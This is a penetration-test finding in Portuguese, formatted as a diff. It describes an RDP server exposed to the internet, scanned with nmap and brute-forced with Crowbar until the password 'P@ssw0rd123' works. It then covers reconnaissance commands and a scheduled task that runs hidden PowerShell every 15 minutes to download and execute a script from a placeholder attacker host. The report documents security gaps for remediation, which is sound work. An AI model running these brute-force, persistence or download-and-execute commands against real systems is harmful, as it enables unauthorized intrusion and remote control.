@@ -1,0 +1,8 @@
+Durante o teste de intrusão, foi identificado que o serviço de Remote Desktop Protocol (RDP) estava exposto na internet, escutando na porta 3389/tcp de um servidor Windows Server 2019. A descoberta ocorreu por meio de uma varredura com o comando nmap -p3389 -sV -oN rdp_scan.txt 200.100.50.12, que revelou a versão do serviço e banner de autenticação ativo.
+
+Em seguida, foi executado um ataque de força bruta utilizando a ferramenta Crowbar, com o comando crowbar -b rdp -u administrador -C senhas_comuns.txt -s 200.100.50.12/32, visando testar combinações de credenciais. Após algumas tentativas, o login foi bem-sucedido com a senha “P@ssw0rd123”, evidenciando a ausência de bloqueio por tentativas consecutivas e de política de complexidade de senha.
+
+Uma vez conectado via RDP, o atacante abriu o prompt de comando para validar privilégios e contexto de execução, executando whoami /priv. Em seguida, foi feito o reconhecimento inicial da rede com net view /domain e ipconfig /all, identificando a presença de um controlador de domínio acessível internamente.
+
+Durante o acesso, observou-se também a ausência de banners de aviso, políticas de desconexão automática e logs de auditoria, o que facilitaria a manutenção de acesso persistente e dificultaria a detecção de intrusões. Por fim, foi configurado o agendamento de uma tarefa de reconexão com schtasks /create /sc minute /mo 15 /tn "RDP KeepAlive" /tr "cmd.exe /c powershell -nop -w hidden IEX(New-Object Net.WebClient).DownloadString('http://attacker[.]com/payload.ps1
+')", assegurando que o controle remoto fosse restabelecido periodicamente.
